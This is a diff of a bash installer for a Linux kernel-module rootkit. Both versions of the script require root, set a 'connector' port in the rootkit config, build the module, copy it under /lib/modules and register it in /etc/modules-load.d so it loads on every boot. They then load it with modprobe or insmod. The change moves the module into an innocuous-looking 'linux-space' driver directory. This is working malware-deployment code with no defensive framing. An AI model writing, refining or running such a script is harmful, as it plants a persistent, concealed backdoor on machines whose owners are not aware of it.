@@ -1,42 +1,49 @@
 #!/bin/bash
 
-# Rootkit Installer with Persistence (Standard misc/ path)
+# Rootkit Installation Script for Persistence
+# This script installs the rootkit to survive reboots
 
 set -e
 
-# Check for root privileges
+# Check if running as root
 if [ "$EUID" -ne 0 ]; then
-    echo "[-] Please run as root"
+    echo "[-] Please run as root (use sudo)"
     exit 1
 fi
 
-# Prompt for port number
+# Get port number from user input
+echo ""
 read -p "Enter the connector port number: " PORT_NUMBER
 if [ -z "$PORT_NUMBER" ]; then
-    echo "[-] Port number is required"
+    echo "[-] Port number is required. Exiting."
     exit 1
 fi
 
 # Validate port number
 if ! [[ "$PORT_NUMBER" =~ ^[0-9]+$ ]] || [ "$PORT_NUMBER" -lt 1 ] || [ "$PORT_NUMBER" -gt 65535 ]; then
-    echo "[-] Invalid port number. Must be between 1 and 65535"
+    echo "[-] Invalid port number. Please enter a valid port (1-65535)."
     exit 1
 fi
 
 echo "[+] Using port: $PORT_NUMBER"
 
-# Update config
+# Update config.yml with the new port number
+echo "[+] Updating configuration with port $PORT_NUMBER..."
 sed -i.bak "s/port: \"[0-9]*\"/port: \"$PORT_NUMBER\"/" rootkit_files/config.yml
 
-# Build rootkit
+# Build rootkit with updated configuration
 echo "[+] Building rootkit..."
 python3 builder.py -c rootkit_files/config.yml -o
 
-# Get rootkit name
+# Get rootkit name from user input after build
 if [ -z "$1" ]; then
+    echo ""
+    echo "Please provide the rootkit name:"
+    echo "Usage: $0 <rootkit_name>"
+    echo "Example: $0 project"
     read -p "Enter rootkit name: " ROOTKIT_NAME
     if [ -z "$ROOTKIT_NAME" ]; then
-        echo "[-] Rootkit name is required"
+        echo "[-] No rootkit name provided. Exiting."
         exit 1
     fi
 else
@@ -44,44 +51,51 @@ else
 fi
 
 KERNEL_VERSION=$(uname -r)
-MODULE_PATH="/lib/modules/${KERNEL_VERSION}/kernel/drivers/misc"
+INSTALL_DIR="/lib/modules/${KERNEL_VERSION}/kernel/drivers"
+MODULE_DIR="${INSTALL_DIR}/linux-space"
 MODULE_CONF="/etc/modules-load.d/${ROOTKIT_NAME}.conf"
-MODULE_KO="${ROOTKIT_NAME}.ko"
 
-# Verify build output
-if [ ! -f "$MODULE_KO" ]; then
-    echo "[-] Build failed: ${MODULE_KO} not found"
+echo "[+] Installing rootkit '${ROOTKIT_NAME}' for persistence..."
+
+# Check if build was successful
+if [ ! -f "${ROOTKIT_NAME}.ko" ]; then
+    echo "[-] Build failed! Please check the build process manually."
     exit 1
 fi
+echo "[+] Rootkit built successfully!"
 
-# Copy to misc/ directory
-echo "[+] Installing to: $MODULE_PATH"
-mkdir -p "$MODULE_PATH"
-cp "$MODULE_KO" "$MODULE_PATH/"
-chmod 644 "$MODULE_PATH/$MODULE_KO"
+# Create module directory
+echo "[+] Creating module directory: ${MODULE_DIR}"
+mkdir -p "${MODULE_DIR}"
 
-# Update module index
-echo "[+] Running depmod..."
+# Copy module to system location
+echo "[+] Copying ${ROOTKIT_NAME}.ko to ${MODULE_DIR}/"
+cp "${ROOTKIT_NAME}.ko" "${MODULE_DIR}/"
+
+# Update module dependencies
+echo "[+] Updating module dependencies..."
 depmod -a
 
-# Create auto-load config
-echo "[+] Creating auto-load config at $MODULE_CONF"
-echo "$ROOTKIT_NAME" > "$MODULE_CONF"
+# Create module auto-load configuration
+echo "[+] Creating auto-load configuration: ${MODULE_CONF}"
+echo "${ROOTKIT_NAME}" > "${MODULE_CONF}"
 
-# Load module now
-echo "[+] Loading module using modprobe..."
-modprobe "$ROOTKIT_NAME"
+# Load the module immediately using insmod (direct loading)
+echo "[+] Loading rootkit module with insmod..."
+insmod "${ROOTKIT_NAME}.ko"
 
-# Verify success
-if lsmod | grep -q "$ROOTKIT_NAME"; then
-    echo "[✓] Rootkit '${ROOTKIT_NAME}' successfully installed and will persist on reboot"
+# Verify module is loaded
+if lsmod | grep -q "${ROOTKIT_NAME}"; then
+    echo "[+] Rootkit successfully installed and loaded!"
+    echo "[+] Module will automatically load on reboot"
+    echo "[+] Installation complete!"
 else
-    echo "[✗] Module did not load. Check 'dmesg' for kernel errors"
+    echo "[-] Failed to load rootkit module"
     exit 1
 fi
 
 echo ""
 echo "Installation Summary:"
-echo "- Installed module: $MODULE_PATH/$MODULE_KO"
-echo "- Auto-load config: $MODULE_CONF"
-echo "- Status: $(lsmod | grep "$ROOTKIT_NAME" | awk '{print $1 " (loaded)"}')"
+echo "- Module installed to: ${MODULE_DIR}/${ROOTKIT_NAME}.ko"
+echo "- Auto-load config: ${MODULE_CONF}"
+echo "- Module status: $(lsmod | grep ${ROOTKIT_NAME} | awk '{print $1 " (loaded)"}')"
